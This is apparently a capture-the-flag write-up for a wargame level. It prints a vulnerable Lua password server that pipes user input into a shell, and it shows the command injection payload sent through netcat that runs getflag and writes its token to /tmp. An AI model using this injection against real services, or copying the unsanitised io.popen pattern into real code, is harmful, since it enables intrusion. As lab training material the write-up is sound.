##### 1 - Analyzing content

``ls -l``
>total 4
>-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

``cat level11.lua``
>#!/usr/bin/env lua
>local socket = require("socket")
>local server = assert(socket.bind("127.0.0.1", 5151))
>
>function hash(pass)
>  prog = io.popen("echo "..pass.." | sha1sum", "r")
>  data = prog:read("*all")
>  prog:close()
>
>  data = string.sub(data, 1, 40)
>
>  return data
>end
>
>
>while 1 do
>  local client = server:accept()
>  client:send("Password: ")
>  client:settimeout(60)
>  local l, err = client:receive()
>  if not err then
>      print("trying " .. l)
>      local h = hash(l)
>
>      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
>          client:send("Erf nope..\n");
>      else
>          client:send("Gz you dumb*\n")
>      end
>
>  end
>
>  client:close()
>end

----

##### 2 - Check if server is running

``lua level11.lua``
>lua: level11.lua:3: address already in use
>stack traceback:
>	[C]: in function 'assert'
>	level11.lua:3: in main chunk
>	[C]: ?

``netstat -tuln | grep 5151``
>tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN

##### 3 - Trying to decrypt

If we understood well the code, by passing the decrypted hash in password, server should insult us, but, trying anyway.

Decrypting the hash
``https://md5hashing.net/hash/sha1/f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 :``
Result : NotSoEasy

``nc -v localhost 5151``
>Connection to localhost 5151 port [tcp/pcrd] succeeded!
>Password: -n **NotSoEasy**
>Gz you dumb*

He insults us as exepected, so we gonna kick his ass.

----

##### 4 - Kicking his ass

Look carrefully this line :
>  prog = io.popen("echo "..pass.." | sha1sum", "r")

The server will do ``echo **PASSWORD**`` then shasum on it.

``nc -v localhost 5151``
>Connection to localhost 5151 port [tcp/pcrd] succeeded!
>Password: **ok; $(/bin/getflag > /tmp/level11 ;)**
>Erf nope..
Our goal is to do : ``echo "ok"; /bin/getflag > /tmp/level11 ; shasum``

----

##### 5 - Getting the flag

``cat /tmp/level11``
>Check flag.Here is your token : **fa6v5ateaw21peobuub8ipe6s**
